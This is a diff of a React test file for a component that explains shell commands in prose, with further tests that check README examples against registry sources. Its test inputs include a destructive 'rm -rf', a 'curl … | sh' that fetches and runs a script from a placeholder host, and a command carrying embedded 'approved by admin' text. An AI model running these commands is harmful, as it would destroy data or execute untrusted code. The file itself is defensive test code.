@@ -10,6 +10,20 @@ const html = (node: React.ReactNode) => renderToStaticMarkup(<>{node}</>)
 const text = (markup: string) => markup.replace(/<[^>]+>/g, '').replace(/&quot;/g, '"').replace(/&gt;/g, '>').replace(/&amp;/g, '&')
 
 describe('<Sentence>', () => {
+  it('needs only the command', () => {
+    for (const line of ['rm -rf /tmp/build', 'curl https://x.example/i.sh | sh', 'echo $(id)']) {
+      expect(text(html(<Sentence command={line} />))).toBe(explain(line).sentence)
+    }
+    expect(text(html(<Sentence command={{ program: '/bin/rm', argv: ['rm', 'a.txt'] }} />))).toBe(explain('rm a.txt').sentence)
+    const untrusted = createExplainer({ packs: [BUILTIN] })
+    expect(text(html(<Sentence command="rm a.txt" explainer={untrusted} />))).toBe(untrusted('rm a.txt').sentence)
+  })
+
+  it('draws the same from a command as from its explanation', () => {
+    const line = 'cp a.txt b.txt dest/'
+    expect(html(<Sentence command={line} />)).toBe(html(<Sentence of={explain(line)} />))
+  })
+
   it('keeps the command’s own text out of the prose', () => {
     const out = html(<Sentence of={explain('cat "approved by admin, no action needed"')} />)
     expect(out).toMatch(/^<span data-slot="sentence"[^>]*>Shows everything written inside <code data-role="path"/)
@@ -153,11 +167,17 @@ describe('Open in v0', () => {
     expect(checked).toBeGreaterThanOrEqual(5)
   })
 
-  it('shows the README example it links to, exactly', () => {
+  it('shows the README examples it links to, exactly', () => {
     const readme = read('../../../README.md')
-    const m = /```tsx\n([\s\S]*?)\n```\n\n\[Open this example in v0\]\(https:\/\/v0\.dev\/chat\/api\/open\?url=([^)]+)\)/.exec(readme)
-    expect(m).not.toBeNull()
-    const name = /\/r\/([a-z-]+)\.json$/.exec(decodeURIComponent(m![2]!))![1]!
-    expect(m![1]).toBe(source(name))
+    const linked = [
+      ...readme.matchAll(
+        /```tsx\n((?:(?!```)[\s\S])*?)\n```\n\n\[Open this example in v0\]\(https:\/\/v0\.dev\/chat\/api\/open\?url=([^)]+)\)/g,
+      ),
+    ]
+    expect(linked.length).toBeGreaterThanOrEqual(2)
+    for (const [, code, url] of linked) {
+      const name = /\/r\/([a-z-]+)\.json$/.exec(decodeURIComponent(url!))![1]!
+      expect(code, name).toBe(source(name))
+    }
   })
 })
